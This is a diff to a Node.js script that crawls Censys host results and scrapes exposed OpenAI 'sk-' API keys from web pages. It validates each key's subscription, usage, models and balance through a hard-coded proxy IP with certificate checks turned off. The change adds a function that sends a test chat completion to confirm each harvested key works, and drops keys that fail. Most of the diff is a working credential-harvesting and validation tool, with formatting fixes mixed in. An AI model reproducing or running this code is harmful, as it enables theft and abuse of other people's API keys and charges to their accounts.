@@ -97,7 +97,7 @@ class OpenAi {
     getSubscription() {
         return new Promise((resolve, reject) => {
             let data = ''
-            
+
             const req = https.request({
                 port: 443,
                 host: '52.152.96.252',
@@ -140,13 +140,13 @@ class OpenAi {
     getUsage() {
         return new Promise((resolve, reject) => {
             let data = ''
-            
+
             const now = new Date()
             const nowStr = `${now.getFullYear()}-${(now.getMonth() + 1 + '').padStart(2, '0')}-${(now.getDate() + '').padStart(2, '0')}`
             const old = new Date(now.getTime() - 95 * 24 * 60 * 60 * 1000)
             const oldStr = `${old.getFullYear()}-${(old.getMonth() + 1 + '').padStart(2, '0')}-${(old.getDate() + '').padStart(2, '0')}`
             // console.log(nowStr, ' -> ', oldStr)
-            
+
             const req = https.request({
                 port: 443,
                 host: '52.152.96.252',
@@ -181,13 +181,14 @@ class OpenAi {
 
         })
     }
+
     /**
      * 获取余额相关数据
      */
     getCreditData() {
         return new Promise((resolve, reject) => {
             let data = ''
-            const req = https.get(url, {timeout}, (res) => {
+            const req = https.get(url, { timeout }, (res) => {
                 res.on('data', (chunk) => {
                     data += chunk
                 })
@@ -204,14 +205,66 @@ class OpenAi {
             })
         })
     }
-    
+
+    /**
+     * 检查对话是否可用
+     */
+    checkCompletion() {
+        return new Promise((resolve, reject) => {
+            let data = ''
+            const body = {
+                "model": "gpt-3.5-turbo",
+                "stream": false,
+                "messages": [
+                    {
+                        "role": "user",
+                        "content": "hi"
+                    }
+                ]
+            }
+
+            const req = https.request({
+                port: 443,
+                host: '52.152.96.252',
+                method: 'POST',
+                path: 'https://api.openai.com/v1/chat/completions',
+                rejectUnauthorized: false,
+                headers: {
+                    Authorization: `Bearer ${this.token}`
+                },
+                timeout
+            });
+            req.write(JSON.stringify(body))
+            req.end();
+            req.on('response', (res) => {
+                res.on('data', chunk => {
+                    data += chunk
+                })
+                res.on('end', () => {
+                    const ret = JSON.parse(data)
+                    if (ret.error)
+                        reject(ret)
+                    else
+                        resolve(ret)
+                })
+                res.on('error', err => {
+                    reject(err)
+                })
+            });
+            req.on('error', err => {
+                reject(err)
+            })
+
+        })
+    }
+
     /**
      * 获取模型数据
      */
     getModelList() {
         return new Promise((resolve, reject) => {
             let data = ''
-            
+
             const req = https.request({
                 port: 443,
                 host: '52.152.96.252',
@@ -250,7 +303,7 @@ class OpenAi {
 
 // 函数实现，参数单位 毫秒 ；
 function wait(ms) {
-    return new Promise(resolve =>setTimeout(() => resolve(), ms));
+    return new Promise(resolve => setTimeout(() => resolve(), ms));
 };
 
 (async () => {
@@ -262,7 +315,7 @@ function wait(ms) {
     try {
         fs.mkdirSync(censysStorageDir, { recursive: true })
     } catch (error) {
-        
+
     }
     if (fs.existsSync(`${censysStorageDir}/progress.json`)) {
         const progress = require(`./${censysStorageDir}/progress.json`)
@@ -271,9 +324,9 @@ function wait(ms) {
         crawler = cursor && cursor.length > 0
     }
 
-    while(crawler) {
+    while (crawler) {
         const resp = await request(cursor)
-        
+
         const { next } = resp.result.links
         // console.log('resp:', resp)
         if (resp.code != 200) {
@@ -281,7 +334,7 @@ function wait(ms) {
             return
         }
         fs.writeFileSync(`${censysStorageDir}/page_${page}.json`, JSON.stringify(resp, null, 4))
-        
+
         cursor = next
         page++;
         fs.writeFileSync(`${censysStorageDir}/progress.json`, JSON.stringify({
@@ -295,10 +348,10 @@ function wait(ms) {
 
     // 再处理数据
     const dir = fs.readdirSync(censysStorageDir)
-    const pageList = dir.filter(e=>e.startsWith('page_'))
+    const pageList = dir.filter(e => e.startsWith('page_'))
     let progress = {}
     const progressLoc = `./${resultStorageDir}/progress.json`
-    
+
     // 多线程，serverIndex是各自拥有
     if (continueTask && fs.existsSync(progressLoc)) {
         const p = require(progressLoc)
@@ -310,14 +363,14 @@ function wait(ms) {
     const doPageTask = async (i, page, serverIndex, result) => {
 
         const resp = require(`./${censysStorageDir}/${page}`)
-            
+
         const { hits: list } = resp.result
-        for(let j = serverIndex; j < list.length; j++) {
+        for (let j = serverIndex; j < list.length; j++) {
             const host = list[j]
-            console.log('pageIndex:', i, 'page:', page,'serverIndex:', j)
+            console.log('pageIndex:', i, 'page:', page, 'serverIndex:', j)
             const { ip, services } = host
-            const httpServices = services.filter(e=>e.service_name === 'HTTP')
-            for(const service of httpServices) {
+            const httpServices = services.filter(e => e.service_name === 'HTTP')
+            for (const service of httpServices) {
                 let newData = null
                 let token = ''
                 try {
@@ -329,7 +382,7 @@ function wait(ms) {
                         continue
                     }
                     const m = html.match(/sk-(.*?)['|"]/)
-                    if (m == null){
+                    if (m == null) {
                         console.log('匹配失败', html)
                     }
                     token = `sk-${m[1]}`
@@ -351,6 +404,14 @@ function wait(ms) {
                         gpt3: isSupportGPT3,
                         gpt4: isSupportGPT4
                     }
+                    try {
+                            
+                        const completion = await ai.checkCompletion()
+                        console.log(`${token} - completion:`, completion)
+                    } catch (error) {
+                        console.log(`${token} - completion error:`, error)
+                        newData = null
+                    }
                     // console.log(`${token}:`, 'getSubscription...')
                     // console.log('newData.subscription:', newData.subscription)
                     // console.log('getUsage...')
@@ -369,9 +430,9 @@ function wait(ms) {
 
                     // 调用方法；
                     await wait(500);
-                }catch(err) {
+                } catch (err) {
                     console.error(`${token}:`, `${service.extended_service_name}://${ip}:${service.port}error:`, err)
-                }finally{
+                } finally {
                     if (newData !== null)
                         result.push(newData)
                 }
@@ -379,7 +440,7 @@ function wait(ms) {
             console.log('保存...')
             try {
                 fs.mkdirSync(resultStorageDir, { recursive: true })
-            }catch(err) {
+            } catch (err) {
 
             }
             fs.writeFileSync(`${resultStorageDir}/result_${page}`, JSON.stringify(result, null, 4))
